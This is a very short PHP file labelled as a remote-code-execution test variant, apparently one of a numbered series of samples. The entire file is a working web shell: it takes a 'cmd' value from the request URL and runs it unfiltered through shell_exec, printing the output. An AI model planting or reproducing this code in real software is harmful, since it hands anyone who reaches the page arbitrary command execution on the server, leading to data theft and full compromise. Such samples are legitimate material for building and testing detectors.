<?php
// RCE test variation #904
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>